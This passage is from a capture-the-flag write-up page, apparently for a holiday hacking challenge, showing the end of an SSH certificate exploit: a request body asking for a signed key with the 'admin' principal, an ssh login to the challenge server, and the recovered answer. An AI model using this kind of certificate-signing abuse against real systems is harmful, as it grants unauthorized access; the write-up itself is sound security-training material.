+{&quot;ssh_pub_key&quot;:&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+HRlKJhlxwczAkF0IAYkEV0wTRloVrLViSiDRWtXsWkDi232bDr74wyin81D+/uarcvz435iUhJilEWBmczxmTa3oeXPNpuDZPUl+93NAU2IojshdZGZ4gITQ/Qp9oth4SIplgEFN/Ubeuw7YCBMJgnsDz07CuauM6YzyaFHon7QV7CWNv5gg7ITu3YAzT7IiU5U6ExK9nEnCQuEY4WiNce6ma32wXUskuKVdhnckKJUwUs2Tt02fUaoMC7YgQG464JiYdlEuhMXv9ZjQ5vgfNyBiRrEaUgvp+Nl4g/D8qsx/qYp1oTLBgfYNd63Ag2gybwh7e5ZVsKOhWzbtMMYC7SNtjFH4T8q+byGrIXMJSAUUo422IDfW+zGPEnVrcF6GmfQZM4dM0AZs1ViKz9nx8K3yi3229RPIHkjz+3B9v3Zf6zWRT0OYA+rc0GFdgKnTu1ZFBq2LiPwj8a9R1+bW9q9qphjfe3CCW+vPs/AXk1WP0T046KDLUdqacxLCJwM= zysygy.elf&quot;,
+&quot;principal&quot;: &quot;admin&quot;}
+</code></pre></div></p>
+<p>Regenerate a public-private keypair following step 1 if you don't have a copy of your original cert.</p>
+</details>
+<p>Like we did in the first step, we can simply copy the newly signed certificate into our public key and connect to alabaster's account:</p>
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>ssh<span class="w"> </span>-o<span class="w"> </span><span class="s2">&quot;IdentitiesOnly=yes&quot;</span><span class="w"> </span>-i<span class="w"> </span>shh<span class="w"> </span>alabaster@ssh-server-vm.santaworkshopgeeseislands.org
+alabaster@ssh-server-vm:/etc/ssh/auth_principals$<span class="w"> </span>cat<span class="w"> </span>alabaster_todo.md<span class="w"> </span>
+<span class="c1"># Geese Islands IT &amp; Security Todo List</span>
+
+-<span class="w"> </span><span class="o">[</span>X<span class="o">]</span><span class="w"> </span>Sleigh<span class="w"> </span>GPS<span class="w"> </span>Upgrade:<span class="w"> </span>Integrate<span class="w"> </span>the<span class="w"> </span>new<span class="w"> </span><span class="s2">&quot;Island Hopper&quot;</span><span class="w"> </span>module<span class="w"> </span>into<span class="w"> </span>Santa<span class="s1">&#39;s sleigh GPS. Ensure Rudolph&#39;</span>s<span class="w"> </span>red<span class="w"> </span>nose<span class="w"> </span>doesn<span class="s1">&#39;t interfere with the signal.</span>
+<span class="s1">- [X] Reindeer Wi-Fi Antlers: Test out the new Wi-Fi boosting antler extensions on Dasher and Dancer. Perfect for those beach-side internet browsing sessions.</span>
+<span class="s1">- [ ] Palm Tree Server Cooling: Make use of the island&#39;</span>s<span class="w"> </span>natural<span class="w"> </span>shade.<span class="w"> </span>Relocate<span class="w"> </span>servers<span class="w"> </span>under<span class="w"> </span>palm<span class="w"> </span>trees<span class="w"> </span><span class="k">for</span><span class="w"> </span>optimal<span class="w"> </span>cooling.<span class="w"> </span>Remember<span class="w"> </span>to<span class="w"> </span>watch<span class="w"> </span>out<span class="w"> </span><span class="k">for</span><span class="w"> </span>falling<span class="w"> </span>coconuts!
+-<span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="o">]</span><span class="w"> </span>Eggnog<span class="w"> </span>Firewall:<span class="w"> </span>Upgrade<span class="w"> </span>the<span class="w"> </span>North<span class="w"> </span>Pole<span class="s1">&#39;s firewall to the new EggnogOS version. Ensure it blocks any Grinch-related cyber threats effectively.</span>
+<span class="s1">- [ ] Gingerbread Cookie Cache: Implement a gingerbread cookie caching mechanism to speed up data retrieval times. Don&#39;</span>t<span class="w"> </span><span class="nb">let</span><span class="w"> </span>Santa<span class="w"> </span>eat<span class="w"> </span>the<span class="w"> </span>cache!
+-<span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="o">]</span><span class="w"> </span>Toy<span class="w"> </span>Workshop<span class="w"> </span>VPN:<span class="w"> </span>Establish<span class="w"> </span>a<span class="w"> </span>secure<span class="w"> </span>VPN<span class="w"> </span>tunnel<span class="w"> </span>back<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>main<span class="w"> </span>toy<span class="w"> </span>workshop<span class="w"> </span>so<span class="w"> </span>the<span class="w"> </span>elves<span class="w"> </span>can<span class="w"> </span>securely<span class="w"> </span>access<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>toy<span class="w"> </span>blueprints.
+-<span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="o">]</span><span class="w"> </span>Festive<span class="w"> </span>2FA:<span class="w"> </span>Roll<span class="w"> </span>out<span class="w"> </span>the<span class="w"> </span>new<span class="w"> </span>two-factor<span class="w"> </span>authentication<span class="w"> </span>system<span class="w"> </span>where<span class="w"> </span>the<span class="w"> </span>second<span class="w"> </span>factor<span class="w"> </span>is<span class="w"> </span>singing<span class="w"> </span>a<span class="w"> </span>Christmas<span class="w"> </span>carol.<span class="w"> </span>Jingle<span class="w"> </span>Bells<span class="w"> </span>is<span class="w"> </span>said<span class="w"> </span>to<span class="w"> </span>be<span class="w"> </span>the<span class="w"> </span>most<span class="w"> </span>secure.
+</code></pre></div>
+<div class="admonition success">
+<p class="admonition-title">Answer</p>
+<p>Gingerbread</p>
+</div>
+<h2 id="response">Response<a class="headerlink" href="#response" title="Permanent link">⚓︎</a></h2>
+<div class="admonition quote">
+<p class="admonition-title">Alabaster Snowball</p>
+<p>Oh my! I was so focused on the SSH configuration I completely missed the vulnerability in the Azure Function App.<br/>
+Why would ChatNPT generate code with such a glaring vulnerability? It's almost like it wanted my system to be unsafe. Could ChatNPT be evil?<br/>
+Thanks for the help, I'll go and update the application code immediately!<br/>
+While we're on the topic of certificates, did you know Active Directory (AD) uses them as well? Apparently the service used to manage them can have misconfigurations too.<br/>
+You might be wondering about that SatTrackr tool I've installed on the monitor account?<br/>
+Here's the thing, on my nightly stargazing adventures I started noticing the same satellite above Geese Islands.<br/>
+I wrote that satellite tracker tool to collect some additional data and sure enough, it's in a geostationary orbit above us.<br/>
+No idea what that means yet, but I'm keeping a close eye on that thing!</p>
+</div>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+        <div class="md-social">
+  
+    
+    
+    
+    
+    <a href="https://github.com/ShahneRodgers" target="_blank" rel="noopener" title="GitHub" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "..", "features": ["toc.integrate", "content.code.copy", "navigation.sections"], "search": "../assets/javascripts/workers/search.f886a092.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.d7c377c4.min.js"></script>
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/tablesort/5.2.1/tablesort.min.js"></script>
+      
+        <script src="../js/tablesort.js"></script>
+      
+    
+  </body>
+</html>
